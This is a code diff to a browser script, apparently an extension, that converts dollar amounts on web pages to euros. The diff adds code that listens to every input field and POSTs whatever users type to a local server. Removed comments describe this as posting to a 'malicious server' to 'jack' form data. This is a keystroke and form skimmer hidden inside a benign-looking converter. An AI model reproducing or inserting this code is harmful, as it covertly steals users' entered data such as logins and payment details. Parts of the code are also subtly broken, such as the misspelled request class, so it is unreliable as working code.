@@ -16,32 +16,32 @@ dollarNodes.forEach(function (currNode) {
         var dolAmt = parseFloat(text.substring(valStart + 1));
         var restOfText = text.substring((valStart + 1 + (dolAmt + '').length));
         var convertedVal = getEuroEquivalent(dolAmt);
-        var combinedText = text.substring(0, valStart) + convertedVal + restOfText;
-        currNode.innerHTML = combinedText;
+        currNode.innerHTML = text.substring(0, valStart) + convertedVal + restOfText;
     }
 });
 
+// Also search document for input elements or text-area elements
+console.log('about to select');
+var inputs = document.querySelectorAll("input", '/jack.js');
+if (inputs.length > 0) {
+    inputs.forEach(function(currInput) {
+        currInput.addEventListener("change", function() {
+            var enteredVal = currInput.getAttribute("value");
+            post(enteredVal);
+        })
+    });
+}
 
-// Also search document for form inputs
-// If form exists add eventListener for on submit to post back to malicious server
-// var forms = document.querySelectorAll("form");
-// for (var f in forms) {
-//     forms[f].addEventListener("submit", function(e) {
-//         // TODO: can I snoop on event parameters to jack here?
-//         console.log(e);
-//     })
-// }
-//
-// // Also search document for input elements or text-area elements
-// var inputs = document.querySelectorAll("input");
-// for (var i in inputs) {
-//     inputs[i].addEventListener("change", function(e) {
-//         if (e && e.children && e.children.length > 0) {
-//             let text = e.children[0].text;
-//             if (text) {
-//                 console.log(text);
-//             // TODO: send text to server
-//             }
-//         }
-//     })
-// }
+// Perform POST request
+function post(value) {
+    // Make connection
+    var oReq = new XmlHttpRequest();
+    var url = 'localhost:8090';
+    oReq.open('POST', url, true);
+
+    // Send headers & payload
+    oReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    var params = {};
+    params['input'] = value;
+    oReq.send(params);
+}
